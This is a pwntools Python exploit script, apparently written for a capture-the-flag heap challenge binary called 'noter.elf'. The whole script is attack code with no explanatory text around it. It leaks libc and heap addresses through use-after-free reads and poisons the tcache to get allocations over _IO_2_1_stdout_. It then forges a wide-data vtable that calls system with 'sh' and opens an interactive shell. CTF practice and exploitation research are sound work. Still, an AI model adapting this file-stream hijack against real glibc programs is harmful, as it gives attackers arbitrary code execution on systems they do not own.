#!/usr/bin/env python
from pwn import *

exe = context.binary = ELF('./noter.elf')
libc = ELF("./libc.so.6")
context.terminal = ['urxvt', '-e']

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return local(argv, *a, **kw)

# b *main+127
# b *write_note+221
gdbscript = '''
b *write_note+221
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

main_arena = 0x210b20

decode_ptr = lambda ptr, offset=0: (mid := ptr ^ ((ptr >> 12) + offset)) ^ (mid >> 24)
encode_ptr = lambda pos, ptr: (pos >> 12) ^ ptr

class Handler:
    def __init__(self, proc):
        self.r = proc
        self.prompt = b"user@noter-console$ "
        self.size = len(self.prompt)

    def new(self, size: int):
        r = self.r
        r.sendlineafter(self.prompt, b"new " + str(size).encode())

    def read(self, idx: int):
        r = self.r
        r.sendlineafter(self.prompt, b"read " + str(idx).encode())
        res = r.recvuntil(self.prompt)[:-self.size].ljust(8, b"\x00")
        r.sendline("help")
        return res

    def write(self, idx: int, msg: bytes):
        r = self.r
        r.sendlineafter(self.prompt, b"write " + str(idx).encode())
        r.sendafter(b"note data: ", msg)

    def delete(self, idx: int):
        r = self.r
        r.sendlineafter(self.prompt, b"del " + str(idx).encode())

    def help(self):
        r = self.r
        r.sendlineafter(self.prompt, b"help")
    
    def exit(self):
        self.r.sendlineafter(self.prompt, b"exit")


io = start()
h = Handler(io)

# === libc leak

h.new(0x411) # 0
h.new(0x200) # 1 | malloc consolidate

h.delete(0)
h.new(0x411) # fill 0 chunk again -> 2
libc.address = u64(h.read(0)) - main_arena
io.warn(f"libc leak: {libc.address:x}")

# === heap leak

h.new(0x200) # 3

h.delete(1) # 1
h.delete(3) # 3
heap_leak = decode_ptr(u64(h.read(3)))
io.warn(f"heap leak: {heap_leak:x}")

# === tcache poisoning

h.write(3, p64(encode_ptr(heap_leak, libc.symbols['_IO_2_1_stdout_'])))

h.new(0x200) # 4 | skip
h.new(0x200) # 5 | _IO_2_1_stdout_ 

# === tcache poisoning 2

h.new(0x300) # 6
h.new(0x300) # 7

h.delete(6) # 6 
h.delete(7) # 7

h.write(7, p64(encode_ptr(heap_leak, libc.symbols['_IO_2_1_stdout_'] + 160)))

h.new(0x300) # 8 | skip
h.new(0x300) # 9 | _IO_2_1_stdout_ + 160 (_wide_data ptr)

# === wide vtable | _wide_data ptr

h.write(1, b"\x00" * 0x18 + p64(libc.symbols["system"])) # wide vtable
h.write(3, 
    (b"\x00" * 0x20 + p64(1)).ljust(0xe0, b"\x00") + \
    p64(heap_leak)
) # _wide_data

# === _IO_2_1_stdout_

# fs =  _wide_data ptr
# fs += vtable
fs =  p64(heap_leak + 0x210).ljust(56, b"\x00")
fs += p64(libc.symbols["_IO_wfile_jumps"] + 0x40 - 0x30) # _IO_jump_t | _IO_wfile_jumps
h.write(5, b"sh\x00")
h.write(9, fs)

io.interactive()
